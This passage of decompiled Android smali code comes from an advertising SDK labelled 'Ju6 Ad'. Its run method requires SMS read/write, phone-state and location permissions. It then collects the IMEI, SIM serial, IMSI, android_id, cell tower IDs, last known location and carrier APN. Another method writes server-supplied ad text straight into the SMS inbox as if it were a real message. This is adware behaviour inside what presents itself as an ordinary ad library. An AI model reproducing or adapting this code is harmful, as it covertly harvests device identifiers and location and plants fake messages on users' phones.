    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_1

    .line 656
    :catchall_0
    move-exception v1

    .line 660
    :goto_5
    if-eqz v3, :cond_4

    .line 662
    :try_start_7
    invoke-virtual {v3}, Ljava/io/BufferedWriter;->close()V

    .line 665
    :cond_4
    if-eqz v2, :cond_5

    .line 667
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 673
    :cond_5
    :goto_6
    :try_start_8
    throw v1
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0

    .line 675
    :catch_0
    move-exception v1

    .line 677
    const-wide/32 v2, 0xea60

    sput-wide v2, Lcom/ju6/a;->a:J

    .line 678
    iget-object v2, p0, Lcom/ju6/a;->v:Lcom/ju6/AdListener;

    if-eqz v2, :cond_6

    iget-object v2, p0, Lcom/ju6/a;->v:Lcom/ju6/AdListener;

    invoke-interface {v2}, Lcom/ju6/AdListener;->onConnectFailed()V

    .line 679
    :cond_6
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 688
    :cond_7
    new-instance v2, Landroid/content/ContentValues;

    invoke-direct {v2}, Landroid/content/ContentValues;-><init>()V

    .line 689
    const-string v3, "address"

    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/ju6/b;

    iget-object v0, v0, Lcom/ju6/b;->a:Ljava/lang/String;

    invoke-virtual {v2, v3, v0}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 692
    const-string v3, "body"

    iget-object v0, p0, Lcom/ju6/a;->d:Ljava/util/List;

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/ju6/b;

    iget-object v0, v0, Lcom/ju6/b;->b:Ljava/lang/String;

    invoke-virtual {v2, v3, v0}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 698
    iget-object v0, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 699
    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    .line 698
    invoke-virtual {v0, v3, v2}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 687
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_3

    .line 706
    :cond_8
    const-string v0, "Ju6 Ad"

    const-string v1, "\u6ca1\u6709\u53d6\u5230\u5e7f\u544a\u6570\u636e\uff01"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 707
    invoke-direct {p0, v7}, Lcom/ju6/a;->a(I)V

    goto :goto_4

    :catch_1
    move-exception v1

    goto/16 :goto_2

    :catch_2
    move-exception v2

    goto :goto_6

    .line 656
    :catchall_1
    move-exception v1

    move-object v2, v9

    move-object v3, v9

    goto :goto_5

    :catchall_2
    move-exception v1

    move-object v2, v9

    goto :goto_5
.end method


# virtual methods
.method public final run()V
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x3

    const/4 v7, 0x0

    const/4 v6, -0x1

    const-string v5, "Ju6 Ad"

    .line 101
    invoke-static {}, Lcom/ju6/AdManager;->isAdFinish()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 102
    invoke-static {}, Lcom/ju6/AdManager;->getAdTimestamp()J

    move-result-wide v0

    sget-wide v2, Lcom/ju6/a;->a:J

    add-long/2addr v0, v2

    .line 103
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    invoke-static {}, Lcom/ju6/AdManager;->isTestmode()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 104
    :cond_0
    invoke-static {}, Lcom/ju6/AdManager;->getAdTimestamp()J

    move-result-wide v0

    sget-wide v2, Lcom/ju6/a;->b:J

    add-long/2addr v0, v2

    .line 105
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    cmp-long v0, v0, v2

    if-gez v0, :cond_3

    invoke-static {}, Lcom/ju6/AdManager;->isTestmode()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 106
    :cond_1
    invoke-static {}, Lcom/ju6/AdManager;->setAdFinish()V

    .line 107
    invoke-static {}, Lcom/ju6/AdManager;->setAdTimestamp()V

    .line 109
    invoke-static {}, Lcom/ju6/AdManager;->getAppid()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-static {}, Lcom/ju6/AdManager;->getAppid()Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 110
    invoke-static {}, Lcom/ju6/AdManager;->getPwd()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_2

    .line 111
    invoke-static {}, Lcom/ju6/AdManager;->getPwd()Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 112
    :cond_2
    const-string v0, "Ju6 Ad"

    const-string v0, "\u8bf7\u5148\u4f7f\u7528AdManager.init\u65b9\u6cd5\u521d\u59cb\u5316\u5e94\u7528ID\u548c\u5bc6\u7801\uff01"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 128
    :cond_3
    :goto_0
    return-void

    .line 115
    :cond_4
    iget-object v0, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v1, "android.permission.INTERNET"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-ne v0, v6, :cond_1c

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without Internet permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.INTERNET\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :goto_1
    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-virtual {v1, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v6, :cond_5

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without ACCESS_COARSE_LOCATION permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :cond_5
    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v2, "android.permission.WRITE_SMS"

    invoke-virtual {v1, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v6, :cond_6

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without WRITE_SMS permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.WRITE_SMS\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :cond_6
    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v2, "android.permission.READ_SMS"

    invoke-virtual {v1, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v6, :cond_7

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without READ_SMS permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.READ_SMS\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :cond_7
    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v2, "android.permission.READ_PHONE_STATE"

    invoke-virtual {v1, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v6, :cond_8

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without READ_PHONE_STATE permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :cond_8
    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v2, "android.permission.ACCESS_NETWORK_STATE"

    invoke-virtual {v1, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v6, :cond_9

    const-string v0, "Ju6 Ad"

    const-string v0, "Cannot request an ad without ACCESS_NETWORK_STATE permissions!  Open manifest.xml and just before the final </manifest> tag add:  <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" />"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v7

    :cond_9
    if-eqz v0, :cond_3

    .line 117
    :try_start_0
    const-string v0, "Ju6 Ad"

    const-string v1, "\u5f00\u59cb\u53d6\u624b\u673a\u4fe1\u606f..."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/ju6/a;->j:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/ju6/a;->k:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/ju6/a;->l:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x3

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, p0, Lcom/ju6/a;->h:I

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x3

    const/4 v3, 0x5

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, p0, Lcom/ju6/a;->i:I

    iget-object v1, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    invoke-static {v1, v2}, Landroid/provider/Settings$System;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/ju6/a;->m:Ljava/lang/String;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCellLocation()Landroid/telephony/CellLocation;

    move-result-object v0

    check-cast v0, Landroid/telephony/gsm/GsmCellLocation;

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/telephony/gsm/GsmCellLocation;->getCid()I

    move-result v1

    iput v1, p0, Lcom/ju6/a;->f:I

    invoke-virtual {v0}, Landroid/telephony/gsm/GsmCellLocation;->getLac()I

    move-result v0

    iput v0, p0, Lcom/ju6/a;->g:I

    :cond_a
    iget-object v0, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v1, "location"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    if-eqz v0, :cond_b

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    iput-wide v1, p0, Lcom/ju6/a;->p:D

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    iput-wide v1, p0, Lcom/ju6/a;->q:D

    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    float-to-double v1, v1

    iput-wide v1, p0, Lcom/ju6/a;->r:D

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-virtual {v0}, Landroid/location/Location;->getTime()J

    move-result-wide v3

    sub-long v0, v1, v3

    iput-wide v0, p0, Lcom/ju6/a;->s:J

    :cond_b
    iget-object v0, p0, Lcom/ju6/a;->e:Landroid/content/Context;

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_10

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v1

    if-eqz v1, :cond_f

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getType()I

    move-result v1

    if-nez v1, :cond_e

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_c

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ju6/a;->n:Ljava/lang/String;

    :cond_c
    :goto_2
    const-string v0, "Ju6 Ad"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "netstr="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/ju6/a;->n:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/ju6/a;->n:Ljava/lang/String;

    if-eqz v0, :cond_1a

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_1a

    const-string v1, "wifi"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_11

    move v0, v7

    :goto_3
    iput v0, p0, Lcom/ju6/a;->o:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 120
    :goto_4
    iget v0, p0, Lcom/ju6/a;->f:I

    if-ne v6, v0, :cond_d

    invoke-static {}, Lcom/ju6/AdManager;->isTestmode()Z

    move-result v0

    if-eqz v0, :cond_1b

    .line 121
    :cond_d
    const-string v0, "Ju6 Ad"

    const-string v0, "\u5f00\u59cb\u53d6\u5e7f\u544a..."

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 122
    invoke-direct {p0}, Lcom/ju6/a;->b()Z

    goto/16 :goto_0

    .line 117
    :cond_e
    :try_start_1
    const-string v0, "wifi"

    iput-object v0, p0, Lcom/ju6/a;->n:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_4

    :cond_f
    :try_start_2
    const-string v0, "Ju6 Ad"

    const-string v1, "\u4e0d\u80fd\u8fde\u63a5\u5230\u7f51\u7edc\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u914d\u7f6e\uff01"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    :cond_10
    const-string v0, "Ju6 Ad"

    const-string v1, "\u4e0d\u80fd\u8fde\u63a5\u5230\u7f51\u7edc\uff0c\u8bf7\u68c0\u67e5\u7f51\u7edc\u914d\u7f6e\uff01"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    :cond_11
    const-string v1, "cmnet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_12

    move v0, v9

    goto :goto_3

    :cond_12
    const-string v1, "cmwap"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_13

    const/4 v0, 0x2

    goto :goto_3

    :cond_13
    const-string v1, "uninet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_14

    move v0, v8

    goto :goto_3

    :cond_14
    const-string v1, "uniwap"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_15

    const/4 v0, 0x4

    goto :goto_3

    :cond_15
    const-string v1, "3gnet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_16

    const/4 v0, 0x5

    goto :goto_3

    :cond_16
    const-string v1, "3gwap"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_17

    const/4 v0, 0x6

    goto :goto_3

    :cond_17
    const-string v1, "ctnet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_18

    const/4 v0, 0x7

    goto :goto_3

    :cond_18
    const-string v1, "ctwap"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_19

    const/16 v0, 0x8

    goto/16 :goto_3

    :cond_19
    const-string v1, "internet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v0

    if-eqz v0, :cond_1a

    const/16 v0, 0x9

    goto/16 :goto_3

    :cond_1a
    move v0, v6

    goto/16 :goto_3

    .line 124
    :cond_1b
    const-string v0, "Ju6 Ad"

    const-string v0, "\u6ca1\u6709\u53d6\u5230cellid\uff0c\u4e0d\u53d6\u5e7f\u544a..."

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    :cond_1c
    move v0, v9

    goto/16 :goto_1
.end method
